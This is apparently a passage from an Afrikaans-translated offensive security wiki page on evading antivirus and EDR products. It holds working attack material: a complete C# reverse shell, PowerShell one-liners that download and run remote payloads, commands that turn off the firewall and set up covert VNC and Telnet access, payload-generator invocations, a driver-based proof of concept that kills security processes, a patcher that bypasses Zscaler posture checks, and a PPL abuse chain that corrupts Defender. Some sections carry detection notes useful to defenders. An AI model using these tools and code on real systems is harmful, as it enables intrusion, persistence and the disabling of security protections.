Die meeste C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) bied reeds die vermoë om C# assemblies direk in geheue uit te voer, maar daar is verskillende maniere om dit te doen:

- **Fork\&Run**

Dit behels die **spawn van 'n nuwe opofferingsproses**, injecteer jou post-exploitation kwaadwillige kode in daardie nuwe proses, voer jou kwaadwillige kode uit en wanneer klaar, beëindig die nuwe proses. Dit het beide voordele en nadele. Die voordeel van die fork-and-run metode is dat uitvoering **buite** ons Beacon-implantaatproses plaasvind. Dit beteken dat as iets in ons post-exploitation aksie verkeerd loop of gevang word, daar 'n **baie groter kans** is dat ons **implantaat oorleef.** Die nadeel is dat jy 'n **groter kans** het om deur **Behavioural Detections** gevang te word.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Dit gaan oor die injectering van die post-exploitation kwaadwillige kode **in sy eie proses**. Op hierdie manier kan jy vermy om 'n nuwe proses te skep en dit deur AV te laat scan, maar die nadeel is dat as iets verkeerd gaan met die uitvoering van jou payload, daar 'n **baie groter kans** is om jou **beacon te verloor** aangesien dit kan crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> As jy meer wil lees oor C# Assembly loading, sien hierdie artikel [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) en hul InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Jy kan ook C# Assemblies **van PowerShell** laai, kyk na [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) en S3cur3th1sSh1t se video (https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Soos voorgestel in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), is dit moontlik om kwaadwillige kode uit te voer deur ander tale te gebruik deur die gekompromitteerde masjien toegang te gee tot die interpreter-omgewing wat op die Attacker Controlled SMB share geïnstalleer is.

Deur toegang tot die Interpreter Binaries en die omgewing op die SMB share toe te laat, kan jy **arbitrêre kode in hierdie tale in die geheue** van die gekompromitteerde masjien uitvoer.

Die repo dui aan: Defender scan steeds die scripts, maar deur Go, Java, PHP ens. te gebruik het ons **meer fleksibiliteit om statiese handtekeninge te omseil**. Toetsing met ewekansige nie-verwikkelde reverse shell scripts in hierdie tale het sukses bewys.

## TokenStomping

Token stomping is 'n tegniek wat 'n aanvaller toelaat om die toegangstoken of 'n sekuriteitsproduk soos 'n EDR of AV te **manipuleer**, sodat hulle sy bevoegdhede kan verminder sodat die proses nie sterf nie, maar nie toestemming het om na kwaadwillige aktiwiteite te kyk nie.

Om dit te voorkom, kan Windows **voorkom dat eksterne prosesse** handvatsels oor die tokens van sekuriteitsprosesse kry.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Soos beskryf in [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), is dit maklik om bloot Chrome Remote Desktop op 'n slagoffer se PC te installeer en dit dan te gebruik om dit oor te neem en volhoubaarheid te handhaaf:
1. Laai af vanaf https://remotedesktop.google.com/, klik op "Set up via SSH", en klik dan op die MSI-lêer vir Windows om die MSI-lêer af te laai.
2. Voer die installer stil uit op die slagoffer (admin benodig): `msiexec /i chromeremotedesktophost.msi /qn`
3. Gaan terug na die Chrome Remote Desktop-bladsy en klik next. Die wizard sal jou dan vra om te autoriseer; klik die Authorize-knoppie om voort te gaan.
4. Voer die gegewe parameter met 'n paar aanpassings uit: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Let op die pin-parameter wat toelaat om die pin te stel sonder om die GUI te gebruik).

## Advanced Evasion

Evasion is 'n baie ingewikkelde onderwerp; soms moet jy baie verskillende bronne van telemetrie in net een stelsel in ag neem, so dit is byna onmoontlik om heeltemal onopgemerk te bly in volwasse omgewings.

Elke omgewing wat jy teëkom sal sy eie sterk- en swakpunte hê.

Ek beveel sterk aan dat jy hierdie praatjie van [@ATTL4S](https://twitter.com/DaniLJ94) kyk om 'n voet in die deur te kry tot meer Advanced Evasion tegnieke.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

This is ook 'n ander goeie praatjie van [@mariuszbit](/https://twitter.com/mariuszbit) oor Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Jy kan [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) gebruik wat **dele van die binary sal verwyder** totdat dit **uitvind watter deel Defender** as kwaadwillig beskou en dit aan jou uiteensit.\
'n Ander instrument wat dieselfde doen is [**avred**](https://github.com/dobin/avred) met 'n oop webdiens wat die diens aanbied by [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Tot Windows10 het alle Windows met 'n **Telnet server** gekom wat jy as administrateur kon installeer deur:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Laat dit **begin** wanneer die stelsel opstart en **voer** dit nou uit:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Verander telnet-poort** (stealth) en skakel firewall af:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Laai dit af van: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (jy wil die bin downloads hê, nie die setup nie)

**OP DIE GASHEER**: Voer _**winvnc.exe**_ uit en stel die bediener op:

- Skakel die opsie _Disable TrayIcon_ in
- Stel 'n wagwoord in by _VNC Password_
- Stel 'n wagwoord in by _View-Only Password_

Skuif dan die binêre _**winvnc.exe**_ en die **nuut** geskepte lêer _**UltraVNC.ini**_ na die **slagoffer**

#### **Omgekeerde verbinding**

Die **aanvaller** moet op sy **gasheer** die binêre `vncviewer.exe -listen 5900` uitvoer sodat dit gereed sal wees om 'n omgekeerde **VNC connection** te vang. Dan, binne die **slagoffer**: Begin die winvnc daemon `winvnc.exe -run` en voer `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` uit

**WAARSKUWING:** Om onopgemerk te bly, moet jy 'n paar dinge nie doen nie

- Moet nie `winvnc` begin as dit reeds loop nie, anders sal jy 'n [popup](https://i.imgur.com/1SROTTl.png) veroorsaak. Kontroleer of dit loop met `tasklist | findstr winvnc`
- Moet nie `winvnc` begin sonder dat `UltraVNC.ini` in dieselfde gids is nie, anders sal dit [die konfigurasie-venster](https://i.imgur.com/rfMQWcf.png) oopmaak
- Moet nie `winvnc -h` vir hulp uitvoer nie, anders sal jy 'n [popup](https://i.imgur.com/oc18wcu.png) veroorsaak

### GreatSCT

Laai dit af van: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Binne GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Nou **begin die lister** met `msfconsole -r file.rc` en **voer die xml payload uit** met:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Huidige defender sal die proses baie vinnig beëindig.**

### Kompileer ons eie reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Eerste C# Revershell

Kompileer dit met:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Gebruik dit met:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# gebruik kompiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Outomatiese aflaai en uitvoering:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lys van C# obfuskeerders: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Gebruik van python vir 'n voorbeeld om injectors te bou:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Ander gereedskap
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – AV/EDR vanaf die kernel-ruimte uitskakel

Storm-2603 het 'n klein konsole-hulpmiddel genaamd **Antivirus Terminator** gebruik om endpoint-beskerming uit te skakel voordat ransomware gedruppel is. Die instrument bring sy **eie kwesbare maar *gesigneerde* driver** en misbruik dit om geprivilegieerde kernel-operasies uit te voer wat selfs Protected-Process-Light (PPL) AV-dienste nie kan blokkeer nie.

Belangrike punte
1. **Signed driver**: Die lêer wat na skyf geskryf is, is `ServiceMouse.sys`, maar die binêr is die regmatig gesigneerde driver `AToolsKrnl64.sys` van Antiy Labs se “System In-Depth Analysis Toolkit”. Omdat die driver 'n geldige Microsoft-handtekening dra, laai dit selfs wanneer Driver-Signature-Enforcement (DSE) aangeskakel is.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Die eerste reël registreer die driver as 'n **kernel service** en die tweede begin dit sodat `\\.\ServiceMouse` van die gebruikersruimte af toeganklik word.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Beëindig 'n ewekansige proses per PID (gebruik om Defender/EDR-dienste te beëindig) |
| `0x990000D0` | Verwyder 'n ewekansige lêer op skyf |
| `0x990001D0` | Laai die driver uit en verwyder die diens |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD slaan user-mode beskerming heeltemal oor; kode wat in die kernel uitgevoer word kan *protected* prosesse oopmaak, hulle beëindig, of met kernel-objekte tamper maak ongeag PPL/PP, ELAM of ander hardening-funksies.

Detection / Mitigation
•  Aktiveer Microsoft se vulnerable-driver block list (`HVCI`, `Smart App Control`) sodat Windows weier om `AToolsKrnl64.sys` te laai.
•  Monitor skeppings van nuwe *kernel* services en waarsku wanneer 'n driver gelaai word vanaf 'n gids wat deur almal geskryf kan word of nie op die allow-list voorkom nie.
•  Kyk uit vir user-mode handles na custom device objects gevolg deur verdagte `DeviceIoControl`-oproepe.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’s **Client Connector** pas device-posture reëls lokaal toe en vertrou op Windows RPC om die resultate aan ander komponente te kommunikeer. Twee swak ontwerpkeuses maak 'n volledige omseiling moontlik:

1. Posture evaluation gebeur **heeltemal client-side** (n boolean word na die bediener gestuur).
2. Internal RPC endpoints valideer slegs dat die verbindende uitvoerbare lêer **gesigneer is deur Zscaler** (via `WinVerifyTrust`).

Deur **vier gesigneerde binaries op die skyf te patch** kan albei meganismes geneutraliseer word:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Return altyd `1` sodat elke kontrole as compliant beskou word |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ enige (selfs unsigned) proses kan aan die RPC-pipes bind |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Vervang met `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Kortgesluit |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
After replacing the original files and restarting the service stack:

* **Al** posture checks gee **groen/kompliant**.
* Unsigned of gemodifiseerde binaries kan die named-pipe RPC endpoints oopmaak (bv. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Die gekompromitteerde gasheer kry onbeperkte toegang tot die interne netwerk soos gedefinieer deur die Zscaler policies.

Hierdie gevallestudie demonstreer hoe suiwer kliëntkantvertrouensbesluite en eenvoudige handtekeningkontroles met 'n paar byte-patches verslaan kan word.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) enforсes 'n signer/level-hiërargie sodat slegs beskermde prosesse met gelyke of hoër vlak mekaar kan manipuleer. Aanvallend gesproke, as jy wettiglik 'n PPL-enabled binary kan loods en sy argumente beheer, kan jy onskadelike funksionaliteit (bv. logging) omskep in 'n beperkte, PPL-ondersteunde write primitive teen beskermde directories wat deur AV/EDR gebruik word.

What makes a process run as PPL
- Die teiken EXE (en enige gelaaide DLLs) moet onderteken wees met 'n PPL-capable EKU.
- Die proses moet geskep word met CreateProcess en die vlagte gebruik: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- 'n Kompatibele protection level moet versoek word wat ooreenstem met die ondertekenaar van die binary (bv. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` vir anti-malware signers, `PROTECTION_LEVEL_WINDOWS` vir Windows signers). Verkeerde levels sal by skepping misluk.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Gebruikspatroon:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Die getekende stelsel-binary `C:\Windows\System32\ClipUp.exe` start homself en aanvaar 'n parameter om 'n log-lêer te skryf na 'n deur die oproeper-gespesifiseerde pad.
- Wanneer dit as 'n PPL-proses gelanseer word, vind die lêerskryf plaas met PPL-ondersteuning.
- ClipUp kan nie paaie met spasies ontleed nie; gebruik 8.3-kortpaaie om na normaalweg beskermde liggings te wys.

8.3 short path helpers
- Lys kortname: `dir /x` in elke ouerdirektorie.
- Lei kortpad af in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Start die PPL-gefasiliteerde LOLBIN (ClipUp) met `CREATE_PROTECTED_PROCESS` deur 'n launcher te gebruik (bv., CreateProcessAsPPL).
2) Gee die ClipUp log-pad-argument om 'n lêer-kreatie in 'n beskermde AV-direktorie af te dwing (bv., Defender Platform). Gebruik 8.3-kortname indien nodig.
3) As die teiken-binary gewoonlik deur die AV oop/gesluit is terwyl dit loop (bv., MsMpEng.exe), skeduleer die skryf tydens boot voordat die AV begin deur 'n auto-start service te installeer wat betroubaar vroeër loop. Valideer die boot-volgorde met Process Monitor (boot logging).
4) By herlaai gebeur die PPL-ondersteunde skryf vóór die AV sy binaries sluit, wat die teikenlêer korrupteer en opstart verhoed.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Aantekeninge en beperkings
- Jy kan nie die inhoud wat ClipUp skryf beheer nie, behalwe die plasing; die primitief is meer geskik vir korrupsie as vir presiese inhoudsinspuiting.
- Vereis plaaslike admin/SYSTEM om 'n diens te installeer/te begin en 'n herbeginvenster.
- Tydsberekening is krities: die teiken mag nie oop wees nie; uitvoering tydens opstart vermy lêerslotte.

Opsporing
- Proseskepping van `ClipUp.exe` met ongebruiklike argumente, veral wanneer dit deur nie-standaard launchers as ouerprosesse gelanseer word, rondom opstart.
- Nuwe dienste wat gekonfigureer is om verdagte binaries outomaties te begin en wat gereeld voor Defender/AV begin. Ondersoek diensskepping/-wysiging vóór Defender opstartfoute.
- Lêer-integriteitsmonitering op Defender binaries/Platform directories; onverwagte lêerskeppings/-wysigings deur prosesse met protected-process-vlae.
- ETW/EDR telemetrie: kyk vir prosesse geskep met `CREATE_PROTECTED_PROCESS` en abnormale PPL-vlakgebruik deur nie-AV binaries.

Versagtingsmaatreëls
- WDAC/Code Integrity: beperk watter signed binaries as PPL mag loop en onder watter ouerprosesse; blokkeer ClipUp-aanroepe buite wettige kontekste.
- Dienshigiëne: beperk skepping/wysiging van outo-start dienste en monitor beginvolgorde-manipulasie.
- Verseker Defender tamper protection en early-launch protections is aangeskakel; ondersoek opstartfoute wat binêre korrupsie aandui.
- Oorweeg om 8.3 kort-naam generering op volumes wat security tooling huisves uit te skakel as dit versoenbaar is met jou omgewing (toets deeglik).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Verwysings

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../banners/hacktricks-training.md}}
